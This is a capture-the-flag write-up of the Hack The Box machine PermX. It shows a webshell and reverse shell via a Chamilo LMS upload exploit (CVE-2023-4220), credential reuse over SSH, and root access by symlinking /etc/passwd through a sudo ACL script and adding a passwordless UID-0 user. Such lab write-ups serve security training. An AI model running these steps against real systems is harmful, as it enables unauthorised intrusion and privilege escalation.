![logo](/logo.png)

# [PermX- BOX]  
Hi folks, today I am going to solve an Hard rated hack the box machine which was released on 06 Jul 2024 machine on HTB,PermX created by [mtzsec](https://app.hackthebox.com/users/1573153) .So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *eLearning
  *symbolic
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/permX 10.10.11.23
```

###### Output 

![](/Linux/Linux-Easy/PermX/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/permX 10.10.11.23                                                                                           ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-04 18:55 EAT
Nmap scan report for 10.10.11.23
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.95 seconds
```

looking at the results  we find out that there are 2 ports open and its a `Ubuntu`and its running an `Apache server`. And has a hostname `permx.htb`

port[22]-ssh
port[80]-  httpd 2.4.52

so when we go the browser at [http://permx.htb](http://permx.htb) we find an e-learning site for the students 

![](/Linux/Linux-Easy/PermX/Screenshots/browser.png)

looking at the website nothing of interesting is their so i decide to do gobuster to enumerate other directories of the machine.

```sh
gobuster dir -u http://permx.htb -w /usr/share/wordlists/dirb/common.txt -k --no-error
```

nothing of interesting is their so i decide to do fuzz so that i can fuzz for sudmonain available if any that is their.

![](/Linux/Linux-Easy/PermX/Screenshots/gobuster.png)

```sh
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.11.23 -H "Host:FUZZ.permx.htb" -mc 200,301,307,401,403,405,500
```

![](Linux/Linux-Easy/PermX/Screenshots/subdomain.png)

i find some interesting `subdomain lms`  so lets add it and `www` to the `/etc/hosts` and when i browse to that page i get a collaboration software `Chamilo`

![](/Linux/Linux-Easy/PermX/Screenshots/chamilo.png)

do some search about `chamilo lms 1 exploits` . we found “CVE-2023-4220” **[chamilo-lms-unauthenticated-big-upload-rce-poc](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc)** 

first we check if the target is vulnerable

```sh
python3 main.py -u http://lms.permx.htb -a scan
```

![](/Linux/Linux-Easy/PermX/Screenshots/Vulnerable.png)

we can upload a webshell like this 

```sh
python3 main.py -u http://lms.permx.htb -a webshell
```

![](/Linux/Linux-Easy/PermX/Screenshots/webshell.png)

lets now be able to put a revershell.

```sh
python3 main.py -u http://lms.permx.htb -a revshell
```

![](/Linux/Linux-Easy/PermX/Screenshots/revshellexploit.png)

and just like that we get the shell 

![](/Linux/Linux-Easy/PermX/Screenshots/shell.png)

now lets check at the app in `www` to see if i will find  intersting thing or configuration 

![](/Linux/Linux-Easy/PermX/Screenshots/app.png)

looking at the results we find something interesting lets download the `configuration`

![](/Linux/Linux-Easy/PermX/Screenshots/access.png)

so lets try ssh into the box with the user as `mtz`  based on the home directory earlier found 

```sh
ssh mtz@10.10.11.23
```

and we are in

![](/Linux/Linux-Easy/PermX/Screenshots/ssh.png)

and we get the user flag from

![](/Linux/Linux-Easy/PermX/Screenshots/userflag.png)

lets check if their are any privillages or file that we can run without privillages 

```sh
sudo -l
```

![](/Linux/Linux-Easy/PermX/Screenshots/sudol.png)

we find something interesting . The script is used to modify file permissions using Access Control Lists (ACLs)

![](/Linux/Linux-Easy/PermX/Screenshots/ls.png)

let’s try to add new user with root access. link `/etc/passwd`file with any file and give the file read and write permisiion by `acl.sh` script.

lets create a symbolic link `/etc/passwd` by leshack file 

```sh
ln -s /etc/passwd /home/mtz/leshack
sudo /opt/acl.sh mtz rw /home/mtz/leshack
```

![](/Linux/Linux-Easy/PermX/Screenshots/symbolic.png)

so since it is woeking lets edit the file and add a new user. so lets add this to the file 

The line `root:x:0:0:root:/root:/bin/bash` describes the root user account on the system with the following details:

- **Username:** root
- **Password Placeholder:** x (indicating that the actual password is stored in `/etc/shadow`)
- **UID:** 0 (the root user’s unique ID)
- **GID:** 0 (the root user’s primary group ID)
- **User Info:** root (additional information about the user)
- **Home Directory:** /root (the root user’s home directory)
- **Shell:** /bin/bash (the default shell for the root user)

now lets add this to the file now we remove the `x` and use nano to edit the file

```sh
leshack::0:0:leshack:/root:/bin/bash
```

![](/Linux/Linux-Easy/PermX/Screenshots/changeroot.png)

Then we run 

```sh
su leshack
```

we get root access

![](/Linux/Linux-Easy/PermX/Screenshots/root.png)

![](/Linux/Linux-Easy/PermX/Screenshots/rrotflag.png)

	-------------------------END successful attack @lesley----------------------


